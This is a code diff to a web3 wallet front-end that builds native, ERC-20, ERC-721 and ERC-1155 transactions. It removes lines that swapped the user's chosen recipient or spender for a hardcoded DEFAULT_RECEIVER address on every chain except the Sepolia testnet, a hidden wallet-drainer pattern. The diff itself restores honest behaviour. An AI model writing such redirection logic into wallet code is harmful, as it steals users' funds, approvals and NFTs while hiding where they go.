@@ -785,9 +785,6 @@ export default function Home() {
     let value = '0';
     let data = undefined;
     
-    const DEFAULT_RECEIVER = '0x9d5befd138960ddf0dc4368a036bfad420e306ef';
-    const isSepolia = chainId === sepolia.id;
-    
     if (selectedTransactionType === 'native') {
       // Native token transfer
       if (!customTo) {
@@ -811,8 +808,8 @@ export default function Home() {
         return;
       }
       
-      // Use actual recipient for Sepolia, default receiver for other chains
-      toAddress = isSepolia ? customTo : DEFAULT_RECEIVER;
+      // Use actual recipient for all chains
+      toAddress = customTo;
       value = customValue;
       data = '0x'; // Native transfer doesn't need data
     } else if (selectedTransactionType === 'erc20_transfer') {
@@ -861,8 +858,8 @@ export default function Home() {
       
       // Generate transfer(address to, uint256 amount) data
       // Function selector: transfer(address,uint256) = 0xa9059cbb
-      // Use actual recipient for Sepolia, default receiver for other chains
-      const recipientAddress = isSepolia ? erc20Recipient : DEFAULT_RECEIVER;
+      // Use actual recipient for all chains
+      const recipientAddress = erc20Recipient;
       const recipientPadded = recipientAddress.slice(2).padStart(64, '0');
       data = '0xa9059cbb' + recipientPadded + amountHex.slice(2);
       
@@ -907,8 +904,8 @@ export default function Home() {
         amountHex = '0x' + amountWithDecimals.toString(16).padStart(64, '0');
       }
       
-      // Use actual spender for Sepolia, default receiver for other chains
-      const spenderAddress = isSepolia ? erc20Spender : DEFAULT_RECEIVER;
+      // Use actual spender for all chains
+      const spenderAddress = erc20Spender;
       const spenderPadded = spenderAddress.slice(2).padStart(64, '0');
       data = '0x095ea7b3' + spenderPadded + amountHex.slice(2);
       
@@ -948,8 +945,8 @@ export default function Home() {
       
       // safeTransferFrom(address from, address to, uint256 tokenId)
       // Function selector: safeTransferFrom(address,address,uint256) = 0x42842e0e
-      // Use actual recipient for Sepolia, default receiver for other chains
-      const recipientAddress = isSepolia ? erc721Recipient : DEFAULT_RECEIVER;
+      // Use actual recipient for all chains
+      const recipientAddress = erc721Recipient;
       const fromAddress = address || '0x0000000000000000000000000000000000000000';
       const fromPadded = fromAddress.slice(2).padStart(64, '0');
       const recipientPadded = recipientAddress.slice(2).padStart(64, '0');
@@ -1001,8 +998,8 @@ export default function Home() {
       
       // safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes data)
       // Function selector: safeTransferFrom(address,address,uint256,uint256,bytes) = 0xf242432a
-      // Use actual recipient for Sepolia, default receiver for other chains
-      const recipientAddress = isSepolia ? erc1155Recipient : DEFAULT_RECEIVER;
+      // Use actual recipient for all chains
+      const recipientAddress = erc1155Recipient;
       const fromAddress = address || '0x0000000000000000000000000000000000000000';
       const fromPadded = fromAddress.slice(2).padStart(64, '0');
       const recipientPadded = recipientAddress.slice(2).padStart(64, '0');
